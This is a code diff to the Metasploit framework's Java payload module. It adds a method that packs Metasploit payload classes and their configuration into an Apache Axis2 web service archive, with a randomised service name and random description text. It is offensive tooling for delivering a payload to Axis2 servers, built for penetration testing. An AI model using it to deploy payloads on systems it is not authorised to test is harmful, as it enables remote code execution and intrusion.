@@ -107,5 +107,41 @@ module Msf::Payload::Java
     zip
   end
 
-end
+  #
+  # Used by stagers to create a axis2 webservice file as a {Rex::Zip::Jar}.
+  # Stagers define a list of class files in @class_files which are pulled
+  # from the MetasploitPayloads gem. The configuration file is created by
+  # the payload's #config method.
+  #
+  # @option :app_name [String] Name of the Service in services.xml. Defaults to random.
+  # @return [Rex::Zip::Jar]
+  def generate_axis2(opts={})
+    raise if not respond_to? :config
 
+    app_name = opts[:app_name] || Rex::Text.rand_text_alpha_lower(rand(8)+8)
+
+    services_xml = %Q{<service name="#{app_name}" scope="application">
+<description>#{Rex::Text.rand_text_alphanumeric(50 + rand(50))}</description>
+<parameter name="ServiceClass">metasploit.PayloadServlet</parameter>
+<operation name="run">
+   <messageReceiver mep="http://www.w3.org/2004/08/wsdl/in-out" class="org.apache.axis2.rpc.receivers.RPCMessageReceiver"/>
+</operation>
+</service>
+}
+
+    paths = [
+      [ 'metasploit', 'Payload.class' ],
+      [ 'metasploit', 'PayloadServlet.class' ]
+    ] + @class_files
+
+    zip = Rex::Zip::Jar.new
+    zip.add_file('META-INF/', '')
+    zip.add_file('META-INF/services.xml', services_xml)
+    zip.add_files(paths, MetasploitPayloads.path('java'))
+    zip.add_file('metasploit.dat', config)
+    zip.build_manifest(:app_name => app_name)
+
+    zip
+  end
+
+end
